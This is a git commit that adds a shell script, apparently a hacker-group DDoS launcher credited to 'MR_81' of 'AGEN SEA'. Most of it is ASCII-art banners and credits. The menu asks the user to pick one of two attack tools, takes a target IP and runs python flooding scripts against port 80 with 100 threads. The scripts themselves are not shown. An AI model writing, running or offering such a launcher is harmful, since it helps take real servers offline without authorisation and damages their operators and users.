62a8b27b7d09b6e098b4af6eccd400f057599fd9
Mr_81 <54518019+lhapan1@users.noreply.github.com>
2019-08-31 04:46:10 +0700

    Add files via upload

---
+++ mr81ddos.sh
@@ -0,0 +1,190 @@
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+echo
+echo
+echo
+echo
+echo $purple"@@@@@@@@@@   @@@@@@@   "
+sleep 1
+echo $purple"@@@@@@@@@@@  @@@@@@@@  "
+sleep 1
+echo $purple"@@! @@! @@!  @@!  @@@  "
+sleep 1
+echo $purple"!@! !@! !@!  !@!  @!@  "
+sleep 1
+echo $purple"@!! !!@ @!@  @!@!!@!   "
+sleep 1
+echo $purple"!@!   ! !@!  !!@!@!    "
+sleep 1
+echo $white"!!:     !!:  !!: :!!   "
+echo $white":!:     :!:  :!:  !:!  "
+echo $white":::     ::   ::   :::  "
+echo $white" :      :     :   : :"
+echo
+echo
+sleep 1
+echo $purple" █████╗  ██╗"
+sleep 1
+echo $purple"██╔══██╗███║"
+sleep 1
+echo $white"╚█████╔╝╚██║"
+sleep 1
+echo $white"██╔══██╗ ██║"
+echo $white"╚█████╔╝ ██║"
+sleep 2
+echo $white" ╚════╝  ╚═╝"
+echo
+figlet -f smshadow "MR_81"
+sleep 1
+figlet -f smshadow "DDOS"
+echo $indigo
+date
+echo $purple"___________________________________________________"
+sleep 1
+echo $purple" [+]Author by      : MR_81 "
+echo $purple" [+]Team           : AGEN SEA         "
+sleep 1
+echo $purple" [+]Thanks to      : GREEN ZOMBIES"
+echo $purple" [+]Thanks to      : MR_ARIANIMOUS"
+sleep 1
+echo $white" [+]Thanks to      : MR_XZ.6"
+echo $white" [+]Thanks to      : B3kT0509"
+sleep 1
+echo $white" [+]Thanks to      : MR_VIRUS"
+echo $white" [+]Thanks to      : MR_DENIMNEWBIE"
+echo $white"___________________________________________________"
+echo
+echo
+echo $purple"---------------------------------------"
+echo $white"               DDOS BY MR_81"
+echo $purple"---------------------------------------"
+echo $purple"[1]"$white".TROJAN WIN32,64.NT"
+echo $purple"[2]"$white".ANDROMEDA XR"
+echo $purple"---------------------------------------"
+echo $blue"MASUKAN PILIHAN ANDA"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+echo $purple"@@@@@@@@@@   @@@@@@@   "
+sleep 1
+echo $purple"@@@@@@@@@@@  @@@@@@@@  "
+sleep 1
+echo $purple"@@! @@! @@!  @@!  @@@  "
+sleep 1
+echo $purple"!@! !@! !@!  !@!  @!@  "
+sleep 1
+echo $purple"@!! !!@ @!@  @!@!!@!   "
+sleep 1
+echo $purple"!@!   ! !@!  !!@!@!    "
+sleep 1
+echo $white"!!:     !!:  !!: :!!   "
+echo $white":!:     :!:  :!:  !:!  "
+echo $white":::     ::   ::   :::  "
+echo $white" :      :     :   : :"
+echo
+echo
+sleep 1
+echo $purple" █████╗  ██╗"
+sleep 1
+echo $purple"██╔══██╗███║"
+sleep 1
+echo $white"╚█████╔╝╚██║"
+sleep 1
+echo $white"██╔══██╗ ██║"
+echo $white"╚█████╔╝ ██║"
+sleep 2
+echo $white" ╚════╝  ╚═╝"
+echo
+figlet -f smshadow "MR_81"
+sleep 1
+figlet -f smshadow "Win.32"
+echo $indigo
+date
+echo $purple"___________________________________________________"
+sleep 1
+echo $purple" [+]Author by      : MR_81 "
+echo $purple" [+]Team           : AGEN SEA         "
+sleep 1
+echo $purple" [+]Thanks to      : GREEN ZOMBIES"
+echo $purple" [+]Thanks to      : MR_ARIANIMOUS"
+sleep 1
+echo $white" [+]Thanks to      : MR_XZ.6"
+echo $white" [+]Thanks to      : B3kT0509"
+sleep 1
+echo $white" [+]Thanks to      : MR_VIRUS"
+echo $white" [+]Thanks to      : MR_DENIMNEWBIE"
+echo $white"___________________________________________________"
+echo
+echo $blue"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t100
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+echo $purple"@@@@@@@@@@   @@@@@@@   "
+sleep 1
+echo $purple"@@@@@@@@@@@  @@@@@@@@  "
+sleep 1
+echo $purple"@@! @@! @@!  @@!  @@@  "
+sleep 1
+echo $purple"!@! !@! !@!  !@!  @!@  "
+sleep 1
+echo $purple"@!! !!@ @!@  @!@!!@!   "
+sleep 1
+echo $purple"!@!   ! !@!  !!@!@!    "
+sleep 1
+echo $white"!!:     !!:  !!: :!!   "
+echo $white":!:     :!:  :!:  !:!  "
+echo $white":::     ::   ::   :::  "
+echo $white" :      :     :   : :"
+echo
+echo
+sleep 1
+echo $purple" █████╗  ██╗"
+sleep 1
+echo $purple"██╔══██╗███║"
+sleep 1
+echo $white"╚█████╔╝╚██║"
+sleep 1
+echo $white"██╔══██╗ ██║"
+echo $white"╚█████╔╝ ██║"
+sleep 2
+echo $white" ╚════╝  ╚═╝"
+echo
+figlet -f smshadow "MR_81"
+sleep 1
+figlet -f smshadow "Win.32"
+echo $indigo
+date
+echo $purple"___________________________________________________"
+sleep 1
+echo $purple" [+]Author by      : MR_81 "
+echo $purple" [+]Team           : AGEN SEA         "
+sleep 1
+echo $purple" [+]Thanks to      : GREEN ZOMBIES"
+echo $purple" [+]Thanks to      : MR_ARIANIMOUS"
+sleep 1
+echo $white" [+]Thanks to      : MR_XZ.6"
+echo $white" [+]Thanks to      : B3kT0509"
+sleep 1
+echo $white" [+]Thanks to      : MR_VIRUS"
+echo $white" [+]Thanks to      : MR_DENIMNEWBIE"
+echo $white"___________________________________________________"
+echo $blue"MASUKAN IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t100
+fi
